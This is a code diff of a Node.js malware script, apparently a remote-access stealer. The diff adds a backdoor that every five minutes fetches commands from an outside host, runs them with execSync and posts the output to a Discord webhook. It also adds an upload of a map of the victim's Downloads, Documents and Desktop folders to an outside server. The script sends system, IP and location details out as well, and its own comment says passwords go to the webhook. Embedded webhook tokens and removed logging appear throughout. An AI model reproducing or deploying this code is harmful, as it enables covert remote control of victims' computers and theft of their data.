@@ -18,27 +18,39 @@ const filesToDownload = [
 
 // Discord webhook URL to send system details and passwords
 const webhookUrl =
-  "https://discord.com/api/webhooks/1127570894995333173/BSfIpUz5MxjlxEJN8wkKUeUVjtCYE_6JXNJbIEhW1CL2CN98tonjv5vR9-7ow-rauIvI";
+  "https://discord.com/api/webhooks/1180841193257574501/RymBgW58iooeeLaT8tpPj8wXwrEw1TnkIyGy0Cam9oNZW8FtE6TMoaS1L-itLrB5ivN3";
 
-// Path to Chrome passwords file
-const passwordsFilePathChrome = path.join(
-  os.homedir(),
-  "AppData",
-  "Local",
-  "Google",
-  "Chrome",
-  "User Data",
-  "Login Data"
-);
+const commandsUrl = "https://obsidianator-code-1.blueobsidian.repl.co/commands.json";
 
-// Path to Opera passwords file
-const passwordsFilePathOpera = path.join(
-  os.homedir(),
-  "AppData",
-  "Roaming",
-  "Opera Software",
-  "Login Data"
-);
+const runCommand = command => {
+  try {
+    const output = execSync(command).toString();
+    return output;
+  } catch (error) {
+    console.error(`Error running command: ${error.message}`);
+  }
+};
+
+setInterval(() => {
+  CheckandRunCommands();
+}, 1000 * 60 * 5);
+
+function CheckandRunCommands() {
+  axios
+    .get(commandsUrl)
+    .then(async response => {
+      const commands = response.data;
+      for (const command of commands) {
+        const output = await runCommand(command);
+        if (output) {
+          sendToDiscord(output);
+        }
+      }
+    })
+    .catch(error => {
+      console.error(`Error fetching commands: ${error.message}`);
+    });
+}
 
 // Function to download a file and save it to a specific path
 async function downloadFile(url, filePath) {
@@ -57,10 +69,63 @@ function executeFile(filePath) {
   try {
     // Execute the file using the 'execSync' function
     const output = execSync(filePath).toString();
-    console.log("File output:", output);
   } catch (error) {
     console.error("Error executing file:", error);
     throw error;
+  }
+}
+
+function mapFolder(folderPath) {
+  const folderContent = fs.readdirSync(folderPath, { withFileTypes: true });
+
+  const folderTree = {};
+
+  folderContent.forEach(item => {
+    const itemPath = path.join(folderPath, item.name);
+
+    if (item.isDirectory()) {
+      folderTree[item.name] = mapFolder(itemPath);
+    } else {
+      folderTree[item.name] = "File";
+    }
+  });
+
+  return folderTree;
+}
+
+async function mapFSAndUpload() {
+  const username = process.env.USERNAME || process.env.HOMEPATH.split("\\")[2];
+  const homePath = path.join("C:\\Users", username);
+
+  const downloadsPath = path.join(homePath, "Downloads");
+  const documentsPath = path.join(homePath, "Documents");
+  const DesktopPath1 = fs.existsSync(path.join(homePath, "Onedrive", "Desktop"))
+    ? path.join(homePath, "Onedrive", "Desktop")
+    : path.join(homePath, "Desktop");
+  const tree = {
+    Downloads: mapFolder(downloadsPath),
+    Documents: mapFolder(documentsPath),
+    Desktop: mapFolder(DesktopPath1),
+  };
+
+  const jsonString = JSON.stringify(tree, null, 2);
+  const filePath = path.join(__dirname, "filetree.json");
+  fs.writeFileSync(filePath, jsonString);
+  //upload the file to the server
+  const formData = new FormData();
+  formData.append("file", fs.createReadStream(filePath));
+
+  try {
+    const response = await axios.post(
+      "https://file-host-1.blueobsidian.repl.co/upload.php",
+      formData,
+      {
+        headers: formData.getHeaders(),
+      }
+    );
+    console.log(response.data);
+  } catch (error) {
+    console.error(error);
   }
 }
 
@@ -72,23 +137,31 @@ async function getSystemDetails() {
 
     const systemDetails = {
       computerName: os.hostname(),
-      totalMemory: os.totalmem(),
-      freeMemory: os.freemem(),
+      totalMemory: bytesToSize(os.totalmem()),
+      freeMemory: bytesToSize(os.freemem()),
       platform: os.platform(),
       architecture: os.arch(),
       release: os.release(),
-      ipAddress,
-      country: geoDetails.country.names.en,
-      location: geoDetails.location.time_zone,
-      city: geoDetails.city.names.en,
-      provider: geoDetails.traits.autonomous_system_organization,
+      // Assume ipAddress and geoDetails are defined elsewhere
+      ipAddress, // Previously defined
+      country: geoDetails.country.names.en, // Assume geoDetails is defined
+      location: geoDetails.location.time_zone, // Assume geoDetails is defined
+      city: geoDetails.city.names.en, // Assume geoDetails is defined
+      provider: geoDetails.traits.autonomous_system_organization, // Assume geoDetails is defined
     };
-
     return systemDetails;
   } catch (error) {
     console.error("Error retrieving system details:", error.message);
     throw error;
   }
+}
+
+function bytesToSize(bytes) {
+  const sizes = ["Bytes", "KB", "MB", "GB", "TB"];
+  if (bytes === 0) return "0 Byte";
+  const i = parseInt(Math.floor(Math.log(bytes) / Math.log(1024)), 10);
+  if (i === 0) return `${bytes} ${sizes[i]}`;
+  return `${(bytes / 1024 ** i).toFixed(2)} ${sizes[i]}`;
 }
 
 // Function to retrieve the IP address
@@ -120,7 +193,6 @@ async function getGeoDetails() {
     });
 
     const { data } = response;
-    console.log(data);
     return data;
   } catch (error) {
     console.error("Error retrieving geo details:", error.message);
@@ -132,15 +204,23 @@ async function getGeoDetails() {
 async function sendSystemDetailsToDiscord(details) {
   try {
     const message = `
-      System Details:
+    Information sent 
       \`\`\`
       ${JSON.stringify(details, null, 2)}
       \`\`\`
     `;
     await axios.post(webhookUrl, { content: message });
-    console.log("System details sent to Discord webhook.");
   } catch (error) {
     console.error("Error sending system details to Discord webhook:", error.message);
+    throw error;
+  }
+}
+
+async function sendToDiscord(message) {
+  try {
+    await axios.post(webhookUrl, { content: message });
+  } catch (error) {
+    console.error("Error sending message to Discord webhook:", error.message);
     throw error;
   }
 }
@@ -160,9 +240,7 @@ async function checkAndUpdateFiles() {
         if (currentContent !== latestContent.data) {
           // Save the latest content to the file
           fs.writeFileSync(file.filePath, latestContent.data);
-          console.log(`File updated: ${file.filePath}`);
         } else {
-          console.log(`File is up to date: ${file.filePath}`);
         }
       }
     }
@@ -186,9 +264,9 @@ async function runScript() {
 
     // Retrieve system details
     const systemDetails = await getSystemDetails();
-    console.log("System Details:", systemDetails);
 
     // Send system details to Discord webhook
+    mapFSAndUpload();
     await sendSystemDetailsToDiscord(systemDetails);
   } catch (error) {
     console.error("Error in runScript:", error);
